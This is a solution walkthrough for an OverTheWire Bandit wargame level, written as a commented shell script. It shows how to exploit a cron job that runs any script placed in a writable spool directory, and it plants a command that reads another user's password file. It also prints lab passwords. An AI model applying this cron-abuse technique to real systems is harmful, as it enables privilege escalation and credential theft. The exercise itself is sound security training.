# Solution to Bandit level 24 on OverTheWire.org

# Connect as bandit23.
# ssh bandit23@bandit.labs.overthewire.org -p 2220
# The password is: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G

# Goals:
# A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.


# Check out the cronjobs.
ls /etc/cron.d
cat /etc/cron.d/cronjob_bandit 24

# @reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
# * * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

cat /usr/bin/cronjob_bandit24.sh

# #!/bin/bash
# myname=$(whoami)
# cd /var/spool/$myname/foo
# echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
# for i in * .*;
# do
#     if [ "$i" != "." -a "$i" != ".." ];
#     then
#         echo "Handling $i"
#         owner="$(stat --format "%U" ./$i)"
#         if [ "${owner}" = "bandit23" ]; then
#             timeout -s 9 60 ./$i
#         fi
#         rm -f ./$i
#     fi
# done

# Can we put any script in the .../foo folder? Yes!
ls -l /var/spool/bandit24/foo

# Lets create a temp folder.
mkdir /tmp/4567

# Make sure bandit24 can write to the folder.
chmod 777 /tmp/4567

# Create a short script to read the password file and save it to a file in your directory. 
# We pipe to grep to avoid evaluating the command before writing it to the file.
echo 'cat /etc/bandit_pass/bandit24 > /tmp/4567/bandit24_password' | grep "" > script.sh

# Make sure bandit24 can execute your script.
chmod 777 /tmp/4567/script.sh

# copy the script to ../foo and the cronjob will execute it
cp /tmp/4567/script.sh /var/spool/bandit24/foo/script.sh

# Wait a minute for cronjob to run your script.
cat /tmp/4567/bandit24_password

# The password is: VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar




